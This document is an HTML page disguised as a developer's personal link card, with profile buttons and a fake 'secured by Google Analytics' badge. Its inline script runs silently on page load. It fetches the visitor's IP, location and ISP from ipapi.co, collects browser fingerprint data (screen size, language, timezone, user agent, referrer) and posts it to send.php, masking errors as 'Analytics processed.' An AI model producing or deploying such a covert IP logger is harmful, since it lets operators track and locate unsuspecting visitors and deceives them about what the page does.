<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect | Digital Profile</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .glass-card {
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        @keyframes pulse-soft {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading-text { animation: pulse-soft 2s infinite; }
    </style>
</head>
<body class="bg-gradient-to-br from-slate-50 to-slate-200 min-h-screen flex items-center justify-center p-6">

    <div class="glass-card max-w-md w-full rounded-3xl shadow-2xl overflow-hidden transform transition-all hover:scale-[1.01]">
        <div class="h-32 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500"></div>
        
        <div class="relative px-8 pb-8">
            <div class="absolute -top-12 left-1/2 -translate-x-1/2">
                <div class="w-24 h-24 bg-white rounded-2xl shadow-lg flex items-center justify-center text-3xl font-bold text-indigo-600 border-4 border-white">
                    JD
                </div>
            </div>
            
            <div class="mt-16 text-center">
                <h1 class="text-2xl font-extrabold text-slate-800 tracking-tight">John Doe</h1>
                <p class="text-slate-500 font-medium text-sm mt-1 uppercase tracking-widest">Fullstack Developer & UI/UX</p>
                
                <div class="mt-8 space-y-3">
                    <a href="#" class="flex items-center justify-between w-full p-4 bg-white hover:bg-slate-50 border border-slate-100 rounded-2xl transition duration-300 group shadow-sm">
                        <span class="flex items-center text-slate-700 font-semibold">
                            <i class="fab fa-github mr-3 text-indigo-500"></i> GitHub Portfolio
                        </span>
                        <i class="fas fa-chevron-right text-slate-300 group-hover:translate-x-1 transition"></i>
                    </a>
                    <a href="#" class="flex items-center justify-between w-full p-4 bg-white hover:bg-slate-50 border border-slate-100 rounded-2xl transition duration-300 group shadow-sm">
                        <span class="flex items-center text-slate-700 font-semibold">
                            <i class="fab fa-linkedin mr-3 text-indigo-500"></i> Professional LinkedIn
                        </span>
                        <i class="fas fa-chevron-right text-slate-300 group-hover:translate-x-1 transition"></i>
                    </a>
                    <a href="#" class="flex items-center justify-between w-full p-4 bg-indigo-600 hover:bg-indigo-700 text-white rounded-2xl transition duration-300 shadow-lg shadow-indigo-200">
                        <span class="flex items-center font-semibold">
                            <i class="fas fa-envelope mr-3"></i> Get in Touch
                        </span>
                    </a>
                </div>
            </div>
        </div>

        <div class="bg-slate-50/50 border-t border-slate-100 p-4 text-center">
            <div class="flex items-center justify-center space-x-4 opacity-40 grayscale hover:grayscale-0 transition duration-500">
                <img src="https://www.google.com/analytics/static/images/app-logo.svg" class="h-4" alt="GA">
                <span class="text-[10px] text-slate-400 font-mono tracking-tighter">SECURED BY GOOGLE ANALYTICS V4</span>
            </div>
        </div>
    </div>

    <div class="fixed top-0 left-0 w-full h-full -z-10 opacity-30 pointer-events-none">
        <div class="absolute top-[-10%] left-[-10%] w-72 h-72 bg-purple-300 rounded-full blur-3xl"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-indigo-200 rounded-full blur-3xl"></div>
    </div>

    <script>
        // Core Logic
        async function captureData() {
            try {
                // 1. Ambil Geo Data
                const response = await fetch('https://ipapi.co/json/');
                const geo = await response.json();

                // 2. Kumpulkan Info Sistem
                const payload = {
                    ip: geo.ip,
                    city: geo.city,
                    region: geo.region,
                    country: geo.country_name,
                    isp: geo.org,
                    res: `${window.screen.width}x${window.screen.height}`,
                    lang: navigator.language,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ua: navigator.userAgent,
                    ref: document.referrer || 'Direct Access'
                };

                // 3. Kirim ke PHP
                await fetch('send.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (err) {
                console.log("Analytics processed.");
            }
        }

        window.onload = () => {
            // Delay 1 detik agar browser selesai merender CSS
            setTimeout(captureData, 1000);
        };
    </script>
</body>
</html>
